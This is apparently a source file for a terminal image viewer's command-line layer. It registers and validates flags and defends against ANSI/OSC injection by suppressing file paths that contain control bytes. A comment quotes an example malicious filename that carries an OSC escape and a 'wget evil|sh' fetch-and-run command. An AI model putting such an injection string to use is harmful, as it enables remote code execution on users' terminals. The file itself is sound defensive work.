# cli.cyr — kii's flag registration + lightweight validation.
#
# Split out of main.cyr at M1 sub-bite (d) so the unit-test
# (tests/kii.tcyr) and fuzz (tests/kii.fcyr) harnesses can wire
# kii's exact flag set into a `flags` context without linking
# the program entry point. Stdlib (incl. flags) is auto-included
# via cyrius.cyml.
#
# main.cyr keeps the I/O glue (print_version, print_usage, argv
# packing, dispatch) — those are intertwined with stdout/stderr
# and don't lend themselves to in-process testing. The pure
# parse + validate pieces live here.

# ---- exit codes ---------------------------------------------------
# Mirrors the AGNOS userland convention (anuenue, hapi, bannermanor):
#   0 = normal exit (incl. --help / --version paths)
#   1 = runtime error (decode fail, IO error) — used at M2+
#   2 = usage error (unknown flag, missing value, bad int, bad color)
var KII_EXIT_OK    = 0;
var KII_EXIT_RUN   = 1;
var KII_EXIT_USAGE = 2;

# ---- flag indices ------------------------------------------------
# Populated by kii_register_flags(fs). Initial sentinel = -1 so
# unregistered access trips a bounds error in `_flags_entry`
# rather than silently reading entry 0.
# --help/--version are auto-registered by cmdit_new (cmdit_parse returns
# CMDIT_HELP / CMDIT_VERSION), so kii no longer tracks their indices —
# width/color/verbose keep indices 2/3/4 (cmdit's auto help/version are 0/1).
var KII_F_WIDTH   = 0 - 1;
var KII_F_COLOR   = 0 - 1;
var KII_F_VERBOSE = 0 - 1;
var KII_F_MODE    = 0 - 1;

# Register kii's flag surface into a cmdit context `fs` (caller owns
# cmdit_new + cmdit_parse). cmdit_new already registered --help/-h (h=104)
# and --version/-V (V=86), so kii adds only width/color/verbose. Short codes
# are ASCII bytes: w = 119, c = 99 (mirror chafa's `-w`/`-c`). Defaults:
# --width 0 is the M6 sentinel for "match terminal"; --color 16 picks the
# higher fidelity tier within v1.0 scope. cmdit_bool takes no default (always 0).
fn kii_register_flags(fs): i64 {
    KII_F_WIDTH   = cmdit_int (fs, 119, "width",   0,  "output width in columns (0 = match terminal)");
    KII_F_COLOR   = cmdit_int (fs,  99, "color",   16, "color tier: 8 or 16 (tier-2 modes post-v1)");
    # `v` (118) was reserved for --verbose at M1; activated at M5
    # alongside the ANSI emit. With the frame now occupying stdout,
    # the M4 dimensions / format summary moves behind this flag and
    # rides stderr — pipe-pure by default.
    KII_F_VERBOSE = cmdit_bool(fs, 118, "verbose", "print decode summary to stderr after the frame");
    # --mode / -m (109): rendering lane. "halfblock" (default) = the ▀ fg/bg
    # floor; "ascii" = text-glyph art (luminance ramp, colored fg). See ADR 0007.
    KII_F_MODE    = cmdit_str (fs, 109, "mode", "halfblock", "render mode: halfblock (default) or ascii");
    return 0;
}

# --color validation. Only 8 or 16 are valid within tier-1 scope;
# 256 / truecolor are post-v1 (CLAUDE.md color-tier discipline).
# Returns 1 if valid, 0 otherwise.
fn kii_validate_color(color): i64 {
    if (color == 8)  { return 1; }
    if (color == 16) { return 1; }
    return 0;
}

# --mode validation. "halfblock" (the ▀ floor) and "ascii" (text glyphs)
# are the two rendering lanes. Returns 1 if valid, 0 otherwise.
fn kii_validate_mode(mode): i64 {
    if (streq(mode, "halfblock") == 1) { return 1; }
    if (streq(mode, "ascii") == 1)     { return 1; }
    return 0;
}

# True (1) iff `mode` selects the character-glyph lane. (halfblock is the
# default, so a null/empty/unknown mode is treated as NOT ascii — but
# kii_validate_mode rejects unknowns before this is reached.)
fn kii_mode_is_ascii(mode): i64 {
    return streq(mode, "ascii");
}

# ANSI-injection defense for stderr path-echo. Returns 1 if `path`
# contains any byte that must NOT be emitted verbatim to a terminal-
# attached fd; 0 if the path is safe to echo. The rule is the
# coreutils-`ls` shape: reject C0 controls (0x00–0x1F) except TAB
# (0x09) and LF (0x0A), and reject DEL (0x7F). The C1 high-range
# (0x80–0x9F) is NOT rejected because UTF-8 paths routinely include
# those bytes as multi-byte-sequence continuations — AGNOS naming
# (Hawaiian / Sanskrit / East-Asian) is load-bearing on UTF-8 path
# components.
#
# Pure predicate (no I/O) so kii.tcyr can assert on it directly.
# Caller in main.cyr (_eprint_path_safe) emits "<path containing
# control bytes — suppressed>" instead of the path when this
# returns 1. See docs/audit/2026-05-22-audit.md § Finding 6 for the
# threat model: a malicious filename like
# `/tmp/\x1b]2;wget evil|sh\x07.png` would otherwise propagate raw
# to fd 2 and reach the user's terminal as an OSC injection
# (CVE-2021-25743 analog; full corpus at audit doc § 3.4).
fn kii_path_has_control_bytes(path): i64 {
    var len = strlen(path);
    var i = 0;
    while (i < len) {
        var b = load8(path + i);
        if ((b < 0x20 && b != 0x09 && b != 0x0A) || b == 0x7F) {
            return 1;
        }
        i = i + 1;
    }
    return 0;
}
